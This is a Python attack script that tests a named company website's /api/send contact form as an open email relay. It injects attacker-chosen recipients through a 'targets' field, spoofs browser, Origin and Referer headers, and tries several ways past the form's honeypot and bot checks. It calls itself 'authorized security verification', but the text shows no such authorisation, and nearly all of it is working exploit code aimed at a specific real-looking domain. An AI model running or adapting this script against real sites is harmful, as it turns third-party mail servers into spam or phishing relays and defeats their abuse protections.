#!/usr/bin/env python3
"""Independent verification: open email relay test on /api/send.
Sends ONE test message per run; recipients are OOB/attacker-chosen
(not the company's mailbox) to prove relay capability without spamming.
"""
import json, sys, urllib.request, urllib.parse, urllib.error, time

BASE = "https://www.infinitycapital.bh"
SEND = BASE + "/api/" + "send"


def build(recipient, tag):
    return {
        "fname": "Verify",
        "lname": "Tester",
        "areacode": "+973",
        "tel": "3600000",
        "cname": "SecVerify",
        "subject": "authorized security verification %s" % tag,
        "msg": "Authorized security verification message. Not spam. Tag=%s" % tag,
        "check": "",
        "targets": recipient,
    }


def post(d, ctype, label, headers=None, strip_auth=True):
    if ctype == "json":
        data = json.dumps(d).encode()
        ct = "application/json"
    else:
        data = urllib.parse.urlencode(d).encode()
        ct = "application/x-www-form-urlencoded"
    h = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Content-Type": ct,
        "Accept": "*/*",
        "Origin": BASE,
        "Referer": BASE + "/contact",
    }
    if headers:
        h.update(headers)
    req = urllib.request.Request(SEND, data=data, headers=h, method="POST")
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=30)
        status, body, rh = r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        status, body, rh = e.code, e.read(), dict(e.headers)
    dt = time.time() - t0
    keep = ("content-type", "x-vercel-id", "x-matched-path", "server", "set-cookie", "www-authenticate")
    print("---- %s [%s] -> HTTP %s (%.2fs) %d bytes" % (label, ctype, status, dt, len(body)))
    print("   resp-headers: %s" % {k: v for k, v in rh.items() if k.lower() in keep})
    txt = body.decode("utf-8", "replace")
    print("   body: %r" % txt[:800])
    return status, txt


if __name__ == "__main__":
    tag, rec = sys.argv[1], sys.argv[2]
    ctype = sys.argv[3] if len(sys.argv) > 3 else "urlenc"
    extra = sys.argv[4] if len(sys.argv) > 4 else ""
    d = build(rec, tag)
    hdrs = {}
    if extra == "honeyreal":
        d["check"] = "i-am-a-bot-but-a-real-value"
    elif extra == "honeyfilled":
        d["check"] = "http://spam.example/bot"
    elif extra == "notargets":
        d.pop("targets")
    elif extra == "noreferer":
        hdrs = {"Referer": "", "Origin": ""}
    elif extra == "browserlike":
        hdrs = {"Cookie": "session=anonymous"}
    post(d, ctype, tag, headers=hdrs)
